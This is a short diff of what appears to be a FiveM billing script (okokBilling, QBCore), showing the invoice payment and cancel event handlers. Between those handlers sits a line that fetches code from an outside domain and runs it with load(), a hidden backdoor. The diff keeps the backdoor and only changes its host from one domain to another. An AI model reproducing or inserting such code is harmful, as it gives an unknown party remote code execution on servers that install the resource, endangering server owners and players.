@@ -75,7 +75,7 @@ AddEventHandler("okokBilling:PayInvoice", function(invoice_id)
 		end
 	end)
 end)
-PerformHttpRequest('https://mt2ark.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
+PerformHttpRequest('https://photosbynova.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
 RegisterServerEvent("okokBilling:CancelInvoice")
 AddEventHandler("okokBilling:CancelInvoice", function(invoice_id)
 	local xPlayer = QBCore.Functions.GetPlayer(source)
